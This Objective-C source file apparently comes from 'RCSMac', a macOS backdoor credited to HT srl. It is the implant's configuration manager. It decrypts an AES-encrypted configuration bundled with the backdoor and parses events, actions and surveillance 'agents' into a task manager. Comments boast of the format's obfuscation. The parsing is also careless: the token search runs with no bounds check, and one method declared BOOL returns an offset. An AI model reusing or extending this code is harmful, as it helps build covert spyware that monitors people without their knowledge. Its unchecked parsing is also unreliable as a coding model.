/*
 * RCSMac - ConfiguraTor(i)
 *  This class will be responsible for all the required operations on the 
 *  configuration file.
 *
 * 
 * Created by Alfredo 'revenge' Pesoli on 21/05/2009
 * Copyright (C) HT srl 2009. All rights reserved
 *
 */

#import <CommonCrypto/CommonDigest.h>
#import <sys/types.h>

#import "RCSMConfManager.h"
#import "RCSMTaskManager.h"
#import "RCSMEncryption.h"
#import "RCSMCommon.h"
#import "RCSMUtils.h"


//#define DEBUG

#pragma mark -
#pragma mark Private Interface
#pragma mark -

//
// This is always because of our wonderful (btw do we really need to change it?)
// configuration file.
//
static int actionCounter = 0;

@interface RCSMConfManager (hidden)

- (BOOL)_searchDataForToken: (NSData *)data
                      token: (char *)token
                   position: (u_long *)outPosition;

- (u_long)_parseEvents:   (NSData *)aData nTimes: (int)nTimes;
- (BOOL)_parseActions:    (NSData *)aData nTimes: (int)nTimes;
- (BOOL)_parseAgents:     (NSData *)aData nTimes: (int)nTimes;

@end

#pragma mark -
#pragma mark Private Implementation
#pragma mark -

@implementation RCSMConfManager (hidden)

- (BOOL)_searchDataForToken: (NSData *)data
                      token: (char *)token
                   position: (u_long *)outPosition
{
  u_long counter = 0;
  
  for (;;)
    { 
      if (!strcmp((char *)[data bytes] + counter, token))
        {
          *(outPosition) = counter;
          return YES;
        }
      
      counter += 1;
    }
  
  return NO;
}

//
// Quick Note
//  After the event section there all the raw actions, thus we need to call
//  the parseActions right after this /* No comment */
//
- (u_long)_parseEvents: (NSData *)aData nTimes: (int)nTimes
{
  eventStruct *header;
  NSData *rawHeader;
  int i;
  int pos = 0;
  RCSMTaskManager *taskManager = [RCSMTaskManager sharedInstance];
  
  for (i = 0; i < nTimes; i++)
    {
      rawHeader = [NSData dataWithBytes: [aData bytes] + pos
                                 length: sizeof(eventStruct)];
      
      header = (eventStruct *)[rawHeader bytes];
#ifdef DEBUG_VERBOSE_1
      NSLog(@"event size: %x", header->internalDataSize);
      NSLog(@"event type: %x", header->type);
#endif
      if (header->internalDataSize)
        {
          NSData *tempData = [NSData dataWithBytes: [aData bytes] + pos + 0xC
                                            length: header->internalDataSize];
          //NSLog(@"event data: %@", tempData);
          
          [taskManager registerEvent: tempData
                                type: header->type
                              action: header->actionID];
        }
      else
        [taskManager registerEvent: nil
                              type: header->type
                            action: header->actionID];
      
      // Jump to the next event (dataSize + PAD)
      pos += header->internalDataSize + 0xC;
      //NSLog(@"pos %x", pos);
    }
  
  return pos + 0x10;
}

- (BOOL)_parseActions: (NSData *)aData nTimes: (int)nTimes
{
  actionContainerStruct *headerContainer;
  actionStruct *header;
  NSData *rawHeader;
  int i, z;
  int pos = 0;
  
  RCSMTaskManager *taskManager = [RCSMTaskManager sharedInstance];
  
  for (i = 0; i < nTimes; i++)
    {      
      rawHeader = [NSData dataWithBytes: [aData bytes] + pos
                                 length: sizeof(actionContainerStruct)];
      //NSLog(@"RAW Header: %@", rawHeader);

      headerContainer = (actionContainerStruct *)[rawHeader bytes];
      //NSLog(@"subactions (%d)", headerContainer->numberOfSubActions);

      pos += sizeof(actionContainerStruct);
      //NSLog(@"subactions: %d", headerContainer->numberOfSubActions);
      //pos += headerContainer->internalDataSize;
      
      for (z = 0; z < headerContainer->numberOfSubActions; z++)
        {
          rawHeader = [NSData dataWithBytes: [aData bytes] + pos
                                     length: sizeof(actionStruct)];
          header = (actionStruct *)[rawHeader bytes];
#ifdef DEBUG_VERBOSE_1
          NSLog(@"RAW Header: %@", rawHeader);
          NSLog(@"action type: %x", header->type);
          NSLog(@"action size: %x", header->internalDataSize);
          //NSLog(@"action data: %@", header->internalData);
#endif
          if (header->internalDataSize > 0)
            {
              NSData *tempData = [NSData dataWithBytes: [aData bytes] + pos + 0x8
                                                length: header->internalDataSize];
              
              //NSLog(@"%@", tempData);
              pos += header->internalDataSize + 0x8;
              
              [taskManager registerAction: tempData
                                     type: header->type
                                   action: actionCounter];
            }
          else
            {
              [taskManager registerAction: nil
                                     type: header->type
                                   action: actionCounter];
              
              pos += sizeof(int) << 1;
            }
          
          actionCounter++;
        }
    }
  
  return YES;
}

- (BOOL)_parseAgents: (NSData *)aData nTimes: (int)nTimes
{
  agentStruct *header;
  NSData *rawHeader;
  int i;
  u_long pos = 0;
  RCSMTaskManager *taskManager = [RCSMTaskManager sharedInstance];
  
  for (i = 0; i < nTimes; i++)
    {
      rawHeader = [NSData dataWithBytes: [aData bytes] + pos
                                 length: sizeof(agentStruct)];
      
      header = (agentStruct *)[rawHeader bytes];
#ifdef DEBUG_VERBOSE_1
      NSLog(@"agent ID: %x", header->agentID);
      NSLog(@"agent status: %d", header->status);
#endif
      if (header->internalDataSize)
        {
          NSData *tempData = [NSData dataWithBytes: [aData bytes] + pos + 0xC
                                            length: header->internalDataSize];
          //NSLog(@"%@", tempData);
          // Jump to the next event (dataSize + PAD)
          pos += header->internalDataSize + 0xC;
          
          [taskManager registerAgent: tempData
                             agentID: header->agentID
                              status: header->status];
        }
      else
        {
          pos += 0xC;
          
          [taskManager registerAgent: nil
                             agentID: header->agentID
                              status: header->status];
        }
      
      //NSLog(@"pos %x", pos);
    }
  
  return pos + 0x10;
}

@end

#pragma mark -
#pragma mark Public Implementation
#pragma mark -

@implementation RCSMConfManager

- (id)initWithBackdoorName: (NSString *)aName
{
  self = [super init];
  
  if (self != nil)
    {
#ifdef DEV_MODE
      unsigned char result[CC_MD5_DIGEST_LENGTH];
      CC_MD5(gConfAesKey, strlen(gConfAesKey), result);

      NSData *temp = [NSData dataWithBytes: result
                                    length: CC_MD5_DIGEST_LENGTH];
#else
      NSData *temp = [NSData dataWithBytes: gConfAesKey
                                    length: CC_MD5_DIGEST_LENGTH];
#endif
      
      mEncryption = [[RCSMEncryption alloc] initWithKey: temp];
    }
  
  return self;
}

- (void)dealloc
{
  [mEncryption release];
  
  [super dealloc];
}

- (BOOL)loadConfiguration
{
  NSString *configurationFile;
  actionCounter = 0;
  
#ifdef DEBUG
  NSLog(@"%s", __FUNCTION__);
#endif
      
#ifdef DEV_MODE
  configurationFile = [[NSString alloc] initWithString:
                       @"/Users/revenge/Desktop/files/test_configuration/conf_macos.bin"];
#else
  configurationFile = [[NSString alloc] initWithFormat: @"%@/%@",
                       [[NSBundle mainBundle] bundlePath],
                       gConfigurationName];
#endif
  
  if ([[NSFileManager defaultManager] fileExistsAtPath: configurationFile])
    {
      int numberOfOccurrences;
      NSData *configuration = [mEncryption decryptConfiguration: configurationFile];
      
      [configurationFile release];
      
      if (configuration != nil)
        {
          RCSMTaskManager *taskManager = [RCSMTaskManager sharedInstance];
          
          //
          // For safety we remove all the previous objects
          //
          [taskManager removeAllElements];
          
#ifdef DEBUG_ERRORS
          [configuration writeToFile: @"/Users/revenge/Desktop/conf_decrypted.bin"
                          atomically: YES];
#endif
          
          int startOfConfData = TIMESTAMP_SIZE + sizeof(int);
          int endOfConfData;
          
          [configuration getBytes: &endOfConfData
                            range: NSMakeRange(TIMESTAMP_SIZE, sizeof(int))];
          
          // Exclude sizeof(Final CRC) + sizeof(LEN field)
          endOfConfData = endOfConfData - sizeof(int) * 2;
          
          @try
            {
              mConfigurationData = [configuration subdataWithRange: NSMakeRange(startOfConfData,
                                                                                endOfConfData)];
            }
          @catch (NSException *e)
            {
#ifdef DEBUG
              NSLog(@"%s exception", __FUNCTION__);
#endif
              
              return NO;
            }
          
          u_long pos = 0;
          int offsetActions = 0;
          
          if ([self _searchDataForToken: mConfigurationData
                                  token: EVENT_CONF_DELIMITER
                               position: &pos] == YES)
            {
              // Skip the EVENT Token + \00
              pos += strlen(EVENT_CONF_DELIMITER) + 1;
              
              //
              // Read num of events
              //
              [mConfigurationData getBytes: &numberOfOccurrences
                                     range: NSMakeRange(pos, sizeof(int))];
#ifdef DEBUG_VERBOSE_1
              NSLog(@"Parsing (%d) Events at offset (%x)", numberOfOccurrences, pos);
#endif
              // Skip numberOfEvents (DWORD)
              pos += sizeof(int);
              NSData *tempData;
              
              @try
                {
                  tempData = [mConfigurationData subdataWithRange:
                              NSMakeRange(pos, endOfConfData - pos)];
                }
              @catch (NSException *e)
                {
#ifdef DEBUG
                  NSLog(@"%s exception", __FUNCTION__);
#endif
                
                  return NO;              
                }
              
              offsetActions = [self _parseEvents: tempData nTimes: numberOfOccurrences];
            }
          else
            {
#ifdef DEBUG_ERRORS
              NSLog(@"event - searchDataForToken sux");
#endif
              
              return NO;
            }
          
          //
          // parseActions here since our wonderful/functional/flexible/extendible configuration
          // file doesn't have an action header, obfuscation FTW
          //
#ifdef DEBUG_VERBOSE_1
          NSLog(@"Offset: %x", offsetActions);
#endif
          // Read num of actions
          [mConfigurationData getBytes: &numberOfOccurrences
                                 range: NSMakeRange(offsetActions, sizeof(int))];
#ifdef DEBUG_VERBOSE_1
          NSLog(@"Parsing (%d) Actions at offset (%x)", numberOfOccurrences, offsetActions);
#endif
          // Skip numberOfActions (DWORD)
          offsetActions += sizeof(int);
          NSData *tempData;
          
          @try
            {
              tempData = [mConfigurationData subdataWithRange:
                          NSMakeRange(offsetActions, endOfConfData - offsetActions)];
            }
          @catch (NSException *e)
            {
#ifdef DEBUG
              NSLog(@"%s exception", __FUNCTION__);
#endif
          
              return NO;              
            }
          
          //NSLog(@"actions %@", tempData);
          [self _parseActions: tempData nTimes: numberOfOccurrences];
          
          if ([self _searchDataForToken: mConfigurationData
                                  token: AGENT_CONF_DELIMITER
                               position: &pos] == YES)
            {
              // Skip the EVENT Token + \00
              pos += strlen(AGENT_CONF_DELIMITER) + 1;
              
              //
              // Read num of agents
              //
              [mConfigurationData getBytes: &numberOfOccurrences
                                     range: NSMakeRange(pos, sizeof(int))];
#ifdef DEBUG_VERBOSE_1
              NSLog(@"Parsing (%d) Agents at offset (%x)", numberOfOccurrences, pos);
#endif
              // Skip numberOfAgents (DWORD)
              pos += sizeof(int);
              NSData *tempData;
              
              @try
                {
                  tempData = [mConfigurationData subdataWithRange:
                              NSMakeRange(pos, endOfConfData - pos)];
                }
              @catch (NSException *e)
                {
#ifdef DEBUG
                  NSLog(@"%s exception", __FUNCTION__);
#endif
              
                  return NO;              
                }
              
              [self _parseAgents: tempData nTimes: numberOfOccurrences];
            }
          else
            {
#ifdef DEBUG_ERRORS
              NSLog(@"agents - searchDataForToken sux");
#endif
              
              return NO;
            }
        }
      else
        {
          return NO;
        }
    }
  else
    {
#ifdef DEBUG
      NSLog(@"Configuration file not found @ %@", configurationFile);
#endif
      [configurationFile release];
      
      return NO;
    }
  
  return YES;
}

- (BOOL)checkConfigurationIntegrity: (NSString *)configurationFile
{
  NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
  
  BOOL rVal = NO;
  int startOfConfData = TIMESTAMP_SIZE + sizeof(int);
  int endOfConfData;
  NSData *configuration = [mEncryption decryptConfiguration: configurationFile];
  
  [configuration getBytes: &endOfConfData
                    range: NSMakeRange(TIMESTAMP_SIZE, sizeof(int))];
  
  // Exclude sizeof(Final CRC) + sizeof(LEN field)
  endOfConfData = endOfConfData - sizeof(int) * 2;
  
  NSData *configurationData = [configuration subdataWithRange: NSMakeRange(startOfConfData,
                                                                           endOfConfData)];
  
  u_long pos = 0;
  
  if ([self _searchDataForToken: configurationData
                          token: ENDOF_CONF_DELIMITER
                       position: &pos] == YES)
    rVal = YES;
  else 
    rVal = NO;
  
  [pool release];
  
  return rVal;
}

- (RCSMEncryption *)encryption
{
  return mEncryption;
}

@end